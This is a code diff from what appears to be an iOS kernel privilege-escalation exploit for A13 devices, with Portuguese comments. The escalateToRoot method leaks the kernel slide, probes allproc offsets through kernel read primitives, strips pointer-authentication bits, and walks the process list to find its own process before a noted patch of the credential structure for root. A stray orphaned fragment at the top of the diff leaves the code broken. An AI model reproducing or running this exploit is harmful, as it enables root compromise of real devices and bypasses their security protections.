@@ -111,35 +111,49 @@ extern char **environ;
     }
 }
 
+0x4000);
+    }
+}
+
 - (BOOL)escalateToRoot {
-    [self logToWeb:@"🔍 Buscando Slide Real (A13)..."];
+    uint64_t slide = [self leakKernelSlide]; // 0x21000000 ou o real
     
-    // Slides comuns para a build 26.3 (múltiplos de 0x200000)
-    uint64_t testes[] = {0x1CC00000, 0x1E400000, 0x20200000, 0x18400000, 0x21000000};
-    uint64_t allproc_offset = 0x8F50000ULL;
+    // Offsets candidatos para AllProc no iOS 26.3 (A13)
+    // Adicionamos o alinhamento de 0x4000 (16KB)
+    uint64_t offsets[] = {0x8F50000, 0x8F54000, 0x91F0000, 0x91F4000};
     uint64_t proc = 0;
 
-    for (int i = 0; i < 5; i++) {
-        uint64_t ptr = (0xFFFFFFF007004000ULL + testes[i] + allproc_offset);
+    for (int i = 0; i < 4; i++) {
+        uint64_t ptr = (0xFFFFFFF007004000ULL + slide + offsets[i]);
         proc = [self kread64:ptr];
         
+        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando Offset 0x%llx -> Proc: 0x%llx", offsets[i], proc]];
+
         if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
-            [self logToWeb:[NSString stringWithFormat:@"🎯 SLIDE ACHADO: 0x%llx", testes[i]]];
-            _kernelSlide = testes[i];
+            [self logToWeb:@"🎯 LISTA LOCALIZADA!"];
             break;
         }
     }
 
-    if (proc == 0) {
-        [self logToWeb:@"❌ Erro: Todos os slides falharam."];
-        return NO;
-    }
+    if (proc == 0) return NO;
 
-    // AGORA O SCAN DO PID VAI FUNCIONAR:
-    uint32_t p68 = [self kread32:(proc + 0x68)];
-    [self logToWeb:[NSString stringWithFormat:@"📊 PID em 0x68: %d", p68]];
-    
-    return (p68 == getpid());
+    // --- TESTE DEFINITIVO DO PID EM 0x68 ---
+    while (proc != 0) {
+        // PAC Strip para A13 (Fundamental!)
+        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+        
+        uint32_t p68 = [self kread32:(proc + 0x68)];
+        
+        if (p68 == getpid()) {
+            [self logToWeb:@"✅ PID CONFIRMADO NO 0x68!"];
+            // ... (segue para o patch de ucred no offset 0xD8)
+            return YES;
+        }
+        
+        // Próximo processo (p_list.le_next é 0x08 no A13)
+        proc = [self kread64:(proc + 0x08)];
+    }
+    return NO;
 }
 
 
